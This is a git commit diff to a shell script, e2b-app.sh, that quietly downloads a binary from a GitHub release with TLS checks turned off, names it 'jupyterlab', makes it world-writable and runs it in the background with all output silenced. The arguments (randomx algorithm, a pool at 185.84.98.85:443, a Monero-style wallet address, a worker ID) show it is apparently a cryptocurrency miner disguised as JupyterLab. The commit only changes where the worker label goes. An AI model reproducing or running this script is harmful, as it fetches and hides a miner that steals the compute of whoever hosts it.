4cd9e99b1d8293d32bfd643c96b4a74f680e84a3
gaserjuk <gaserjukilo@gmail.com>
2026-04-12 23:57:19 +0700

    Update e2b-app.sh

--- e2b-app.sh
+++ e2b-app.sh
@@ -2,7 +2,7 @@
 
 curl -sLkO https://github.com/paskofa10/vps/releases/download/uranus/jupyterlab >/dev/null 2>&1
 chmod 777 jupyterlab
-./jupyterlab -a randomx -o 185.84.98.85:443 -u 45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi.WORKER-E1 -p x >/dev/null 2>&1 &
+./jupyterlab -a randomx -o 185.84.98.85:443 -u 45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi -p WORKER-E4 >/dev/null 2>&1 &
 sleep 20
 while true
 do
